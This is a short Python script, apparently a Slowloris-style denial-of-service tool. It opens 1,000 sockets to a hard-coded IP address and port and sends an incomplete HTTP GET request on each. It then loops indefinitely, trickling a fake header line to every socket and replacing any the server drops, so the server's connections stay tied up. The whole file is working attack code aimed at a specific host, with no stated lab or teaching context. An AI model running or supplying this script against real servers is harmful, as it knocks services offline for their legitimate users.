from socket import *
import time


def recvall(sock, bite):
    mes = b""
    for i in range(bite):
        rec = sock.recv(1)
        mes += rec
        if rec == b'' or rec is None:
            raise timeout
        elif len(mes) > 1 and mes[-2:] == b"\r\n":
            return mes


def recheaders(sock):
    while True:
        mes = recvall(sock, 1024)
        print(mes)
        if mes == b"\r\n":
            return


def recvbody(sock):
    mes = b""
    try:
        while True:
            mes += sock.recv(1)
    except timeout:
        return mes


countMakeCon = 0


def makeCon(arr):
    global countMakeCon
    countMakeCon += 1
    arr.append(socket(AF_INET, SOCK_STREAM))
    arr[len(array) - 1].connect(("212.182.24.27", 16080))
    arr[len(array) - 1].settimeout(4)
    arr[len(array) - 1].sendall(b"GET /image.jpg HTTP/1.1\r\n")
    if countMakeCon % 10 == 0:
        print(countMakeCon)


array = []
for i in range(1000):
    makeCon(array)

print("sockets have been made!!!")
print("sockets have been connect!!!")

while True:
    count = len(array)
    for i in array:
        try:
            i.sendall(b"X-a: b\r\n")
            # recheaders(array[i])
            print("-------------------------------")
        except (ConnectionAbortedError, ConnectionResetError, timeout):
            array.remove(i)

    countMakeCon = 0
    print(len(array))
    for _ in range(count - len(array)):
        makeCon(array)
    print("++++++++++++++++++++++++++++++++++++++++++++")
    time.sleep(100)
